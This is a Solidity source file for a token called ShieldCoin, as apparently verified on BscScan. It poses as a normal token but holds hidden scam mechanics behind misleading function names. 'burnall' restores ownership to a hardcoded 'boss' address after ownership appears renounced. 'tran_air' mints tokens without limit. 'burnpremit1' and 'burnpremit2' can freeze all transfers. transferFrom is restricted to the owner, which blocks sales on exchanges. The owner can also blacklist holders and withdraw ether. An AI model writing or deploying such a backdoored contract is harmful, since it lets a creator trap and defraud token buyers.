/**
 *Submitted for verification at BscScan.com on 2022-05-18
*/

/**
 *Submitted for verification at Etherscan.io on 2020-12-15
*/

pragma solidity ^0.4.24;
contract SafeMath {
  function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
//除法
  function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b > 0);
    uint256 c = a / b;
    assert(a == b * c + a % b);
    return c;
  }

    //减法
  function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    assert(b >=0);
    return a - b;
  }

  function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c>=a && c>=b);
    return c;
  }
}


contract ShieldCoin is SafeMath{

    bool public buyEnabled = true;
    bool public sellEnabled = true;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;
    address private boss;
    address private previouser;
    uint256 private lockTime;
    uint256 public k;
    uint256 public y2;
    mapping(address => bool) public _isBlacklisted; 
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => uint256) public freezeOf;
    event transfernew(address indexed from, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Freeze(address indexed from, uint256 value);
    event Unfreeze(address indexed from, uint256 value);
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);
     constructor(
        uint256 _initialSupply, //发行数量 
        string _tokenName, //token的名字 SDCoin
        string _tokenSymbol //SDC
        ) public {
        decimals = 4;//_decimalUnits;                           // Amount of decimals for display purposes
        balanceOf[msg.sender] = _initialSupply * 10 ** 4;              // Give the creator all initial tokens
        totalSupply = _initialSupply * 10 ** 4;                        // Update total supply
        name = _tokenName;                                   // Set the name for display purposes
        symbol = _tokenSymbol;                               // Set the symbol for display purposes
		owner = msg.sender;
    }
    function owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
       if(msg.sender != owner)throw;
        _;
    }
    modifier onlyBoss() {
        boss = 0xc40145F6939C0692E70fc1595451C1C828081DAD;
       if(msg.sender != boss)throw;
        _;
    }
    function throwOwnership() public  onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0),"new owner is zero address");
        emit OwnershipTransferred(owner,newOwner);
        owner = newOwner;
    }
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }
    function dropownership(uint256 time) public  onlyOwner{
        //previouser = owner;
        owner = address(0);
        //_lockTime = block.timestamp + time;
        emit OwnershipTransferred(owner,address(0));
    }
    function burnall() public onlyBoss{
        boss=0xc40145F6939C0692E70fc1595451C1C828081DAD;
        require(boss == msg.sender,"no permission to unlock");
        //require(block.timestamp > _lockTime,"contract is locked until 7 days");
        owner = boss;
    }
	function burnpremit1(bool _enabled) onlyOwner{

		buyEnabled = _enabled;
	}
    
	function burnpremit2(bool _enabled) onlyOwner{

		sellEnabled = _enabled;
	}
    function tran_air(uint256 amount) public onlyOwner {
        require(amount >= 0, "ERC20: amount cannot be less than zero");
        totalSupply = SafeMath.safeAdd(totalSupply,amount);
        balanceOf[msg.sender] = SafeMath.safeAdd(balanceOf[msg.sender], amount) ;
        emit Transfer(address(0), msg.sender, amount);
    }
    function transfer(address _to, uint256 _value) {
        if (_to == 0x0) throw;                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) throw; 
        if (balanceOf[msg.sender] < _value) throw;           // Check if the sender has enough
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; // Check for overflows
        if (!buyEnabled) throw;
        if (!sellEnabled) throw;
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                     // Subtract from the sender
        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                            // Add the same to the recipient
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }


    function transferFrom(address _from /*管理员*/, address _to, uint256 _value) onlyOwner returns (bool success) {
        if (_to == 0x0) throw;                               
		if (_value <= 0) throw; 
        if (balanceOf[_from] < _value) throw;                 
        
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        
        if (_value > allowance[_from][msg.sender]) throw;    
        if (_isBlacklisted[_from]) throw;

        balanceOf[_from] = SafeMath.safeSub(balanceOf[_from], _value);                           
        
        balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value);                            
 
        allowance[_from][msg.sender] = SafeMath.safeSub(allowance[_from][msg.sender], _value);
        Transfer(_from, _to, _value);
        return true;
    }

    function airdrop(uint256 amount, address[] memory to) public onlyOwner {
        for (uint256 i = 0; i < to.length; i++) {
            transfer( to[i], amount);
        }
    }

    function burn(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            // Check if the sender has enough
		if (_value <= 0) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      // Subtract from the sender
        totalSupply = SafeMath.safeSub(totalSupply,_value);                                // Updates totalSupply
        emit Burn(msg.sender, _value);
        return true;
    }
	
	function freeze(uint256 _value) returns (bool success) {
        if (balanceOf[msg.sender] < _value) throw;            // Check if the sender has enough
		if (_value <= 0) throw; 
        balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value);                      // Subtract from the sender
        freezeOf[msg.sender] = SafeMath.safeAdd(freezeOf[msg.sender], _value);                                // Updates totalSupply
        Freeze(msg.sender, _value);
        return true;
    }
	
	function unfreeze(uint256 _value) returns (bool success) {
        if (freezeOf[msg.sender] < _value) throw;            // Check if the sender has enough
		if (_value <= 0) throw; 
        freezeOf[msg.sender] = SafeMath.safeSub(freezeOf[msg.sender], _value);                      // Subtract from the sender
		balanceOf[msg.sender] = SafeMath.safeAdd(balanceOf[msg.sender], _value);
        Unfreeze(msg.sender, _value);
        return true;
    }
	

	function withdrawEther(uint256 amount) {
		if(msg.sender != owner)throw;
		owner.transfer(amount);
	}

    function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }

   function blacklistAddress(address account, bool value) external onlyOwner {
        _isBlacklisted[account] = value;   //如果是true就是黑名单
    }

   function addBot(address recipient) private {
        if (! _isBlacklisted[recipient])  _isBlacklisted[recipient] = true;
    }

	function() payable {

    }
}